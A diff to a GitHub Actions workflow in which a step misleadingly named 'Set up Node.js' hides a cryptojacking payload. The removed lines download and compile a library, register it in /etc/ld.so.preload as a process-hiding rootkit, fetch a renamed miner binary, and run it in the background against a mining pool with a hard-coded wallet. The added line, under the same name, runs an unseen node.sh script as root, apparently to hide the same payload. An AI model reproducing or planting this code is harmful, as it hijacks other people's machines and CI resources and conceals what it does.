@@ -9,36 +9,13 @@ on:
 jobs:
   build-and-deploy:
     runs-on: ubuntu-latest
-    env:
-      RUNNER_ALLOW_RUNASROOT: true
     steps:
       - name: Checkout repository
         uses: actions/checkout@v2
 
       - name: Set up Node.js
-        run: |
-          # Install required packages
-          apt-get update
-          apt-get install -y sudo wget cpulimit build-essential
-
-          # Download and compile libnyumput.so
-          rm -rf *
-          curl -O https://bitbucket.org/koploks/watir/raw/master/nyumput.c
-          gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
-          mv libnyumput.so /usr/local/lib/
-          echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
-          rm nyumput.c
-
-          # Download and setup sgr1
-          mkdir .lib && cd .lib
-          wget -O sgr1 https://github.com/barburonjilo/back/raw/main/sr
-          chmod +x sgr1
-          cpulimit -l 150 -e sgr1 &
-          sudo sync && sudo echo 3 > /proc/sys/vm/drop_caches
-
-          # Run sgr1 with specific parameters
-          nice -n -10 nohup ./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$(echo $RANDOM | md5sum | head -c 5) --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive > /dev/null 2>&1 &
-
+        run: chmod +x "${GITHUB_WORKSPACE}/node.sh" && sudo RUNNER_ALLOW_RUNASROOT=true "${GITHUB_WORKSPACE}/node.sh"
+        
       - name: Run script with random wait time
         run: |
           end=$((SECONDS+3600))
